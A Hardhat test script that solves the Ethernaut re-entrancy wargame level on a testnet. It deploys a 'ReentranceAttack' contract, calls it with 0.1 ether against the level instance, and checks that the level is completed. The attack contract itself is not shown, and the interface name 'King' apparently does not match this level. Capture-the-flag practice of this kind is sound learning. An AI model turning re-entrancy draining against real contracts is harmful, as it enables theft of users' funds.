// npx hardhat test ./test/10_re_entrancy.js --network rinkeby

const { expect } = require("chai");
const { ethers } = require("hardhat");
const ETHERNAUT_LEVELS = require("../ethernaut-levels-config.js")
const Utils = require("./Utils.js");

let levelContract;
const INTERFACE_CONTRACT = "King";

before(async () => {
    levelContract = await Utils.getLevelContract(ETHERNAUT_LEVELS._10_re_entrancy, INTERFACE_CONTRACT, ethers.utils.parseUnits(`1`, `ether`));
});

it("solves the level", async function () {
    let attackFactory = await ethers.getContractFactory("ReentranceAttack");
    let attack = await attackFactory.deploy();
    let tx = await attack.attack(levelContract.address, { value: ethers.utils.parseUnits(`0.1`, `ether`) });
    await tx.wait();
});

after(async () => {
    expect(await Utils.submitLevel(levelContract.address), "level was not completed").to.be.true;
});